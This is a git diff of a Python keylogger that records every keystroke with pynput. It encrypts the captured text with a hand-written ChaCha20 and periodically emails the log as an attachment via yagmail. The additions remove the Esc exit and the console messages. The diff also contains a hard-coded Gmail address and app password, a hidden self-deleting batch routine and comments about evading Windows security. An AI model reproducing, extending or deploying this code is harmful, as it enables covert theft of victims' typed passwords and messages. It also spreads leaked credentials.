@@ -1,7 +1,6 @@
 from pynput import keyboard
-# from watchdog.observers import Observer
-# from watchdog.events import FileSystemEventHandler
 import os, sys, time, subprocess
+import psutil
 
 # key for ChaCha20
 key = [
@@ -15,6 +14,17 @@ key = [
     0x1f1e1d1c
 ]
 block = 0
+keys = ""
+
+def generate_nonce():
+    nonce_bytes = os.urandom(12)
+    return [
+        int.from_bytes(nonce_bytes[0:4], 'big'),
+        int.from_bytes(nonce_bytes[4:8], 'big'),
+        int.from_bytes(nonce_bytes[8:12], 'big'),
+    ]
+
+nonce = generate_nonce()
 
 def delete_self():
     path_exe = os.path.realpath(sys.argv[0])  # get absolute path to exe file
@@ -34,40 +44,84 @@ def delete_self():
     subprocess.Popen([bat], shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
 
 def on_press(key):
-    if key == keyboard.Key.esc:
-        return False
+    global keys, block
+    # if key == keyboard.Key.esc:
+    #     return False
     
     # current_path = os.path.dirname(sys.executable)
     # path = os.path.dirname(current_path) + "/log.txt"
     path = "log.txt"
 
-    with open(path, "a") as file:
-        try:
-            file.write(f"{key.char}")
-        except AttributeError:
-            if key.name == "enter":
-                file.write("\n")
-            elif key.name == "space":
-                file.write(" ")
-            else:
-                file.write(f"[{key.name}]")
+    try:
+        char = key.char
+    except AttributeError:
+        char = None
+
+    if char and char.isascii():
+        keys += char
+    else:
+        if key.name == "enter":
+            keys += "\n"
+        elif key.name == "space":
+            keys += " "
+        else:
+            keys += f"[{key.name}]"
+
+    if not os.path.exists(path) or os.path.getsize(path) == 0:
+        with open(path, "wb") as f:
+            for word in nonce:
+                f.write(word.to_bytes(4, 'big'))
+
+    if len(keys) >= 64:
+        ascii_bytes = keys.encode("ascii", errors="ignore")
+        plaintext = ascii_bytes[:64]
+
+        keystream = ChaCha20(nonce)[:64]
+        encrypted = bytes([p ^ k for p, k in zip(plaintext, keystream)])
+
+        with open("log.txt", "ab") as f:  # append mode
+            f.write(encrypted)
+
+        keys = ascii_bytes[64:].decode("ascii", errors="ignore")
+        block += 1
+
+
+    # with open(path, "a") as file:
+    #     try:
+    #         file.write(f"{key.char}")
+    #     except AttributeError:
+    #         if key.name == "enter":
+    #             file.write("\n")
+    #         elif key.name == "space":
+    #             file.write(" ")
+    #         else:
+    #             file.write(f"[{key.name}]")
 
 # windows security immediately deletes exe if can send email.
 # to send email, needs 2fa with phone number and uses app passwords 
 # (this is a vulnerability in my code as the phone number could be tracked down)
 import yagmail
 def send_email():
+    global nonce
     # dont send email if file is small
-    if os.path.getsize("log.txt") <    512:
-        print("cancel email send")
+    try:
+        if os.path.getsize("log.txt") < 256:
+            return
+    except:
         return
     
+    
     yag = yagmail.SMTP('xanofoxewa20@gmail.com', 'bvez hsnw ptsr isdd ')
-    yag.send('example_email@gmail.com', 'test send email', contents = 'hi', attachments = "log.txt")
+    yag.send('example_email@gmail.com', 'Subject', attachments = "log.txt")
 
     # clears file
+    nonce = generate_nonce()
     with open("log.txt", "w") as file:
         pass
+
+# ChaCha20 implementation in python
+# Based on this implementation of ChaCha20 in javascript: 
+# https://github.com/skeeto/chacha-js/blob/master/chacha.js
 
 def rotate_left(value, shift):
     return ((value << shift) & 0xFFFFFFFF) | (value >> (32 - shift))
@@ -90,7 +144,6 @@ def quarter_round(matrix, a, b, c, d):
     matrix[c] += (matrix[c] + matrix[d]) & 0xFFFFFFFF
     matrix[b] ^= matrix[c]
     matrix[b] = rotate_left(matrix[b], 7)
-
 
 def ChaCha20(nonce):
     matrix = [0] * 16
@@ -133,7 +186,26 @@ def ChaCha20(nonce):
         keystream.append((word >> 24) & 0xFF)
     
     return keystream
-        
+
+
+# def explorer_accessing_folder(folder_path):
+#     folder_path = os.path.abspath(folder_path).lower()
+#     for proc in psutil.process_iter(['name']):
+#         if proc.info['name'] and proc.info['name'].lower() == 'explorer.exe':
+#             try:
+#                 open_files = proc.open_files()
+#                 if not open_files:
+#                     continue
+#                 for f in open_files:
+#                     # Normalize and compare paths
+#                     file_path = os.path.abspath(f.path).lower()
+#                     # Check if file_path is inside folder_path
+#                     if file_path.startswith(folder_path):
+#                         print(f"Explorer has file open: {file_path}")
+#                         return True
+#             except (psutil.AccessDenied, psutil.NoSuchProcess):
+#                 continue
+#     return False
 
 # make program always run at startup
 # taken from : https://stackoverflow.com/questions/65844536/making-python-code-run-at-startup-in-windows
@@ -148,27 +220,11 @@ def ChaCha20(nonce):
 #     with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
 #         bat_file.write(f'start "" {path_exe}')
 
+# main
 listener = keyboard.Listener(on_press=on_press)
 listener.start()
 
-# tries to delete itself.
-# listener.join()     # waits for listener to stop listening
-        
-# directory_path = os.path.dirname(sys.executable)
-
-# time.sleep(2)
-# last_access_time = os.stat(directory_path).st_atime
-
-# while True:
-#     time.sleep(1)
-#     new_access_time = os.stat(directory_path).st_atime
-#     if (new_access_time > last_access_time):
-#         print(f"last {last_access_time}")
-#         print(f"new {new_access_time}")  
-#         # delete_self()
-#         break
-
-# listener.stop()
+directory_path = os.path.dirname(sys.executable)
 
 i = 0
 while (1):
@@ -176,11 +232,7 @@ while (1):
     i += 1
     if i > 30:
         i = 0
-        print("sending email")
         send_email()
         time.sleep(10)
-        print("email sent")
 
-print("program over")
-
-# https://github.com/skeeto/chacha-js/blob/master/chacha.js encryption
+listener.stop()
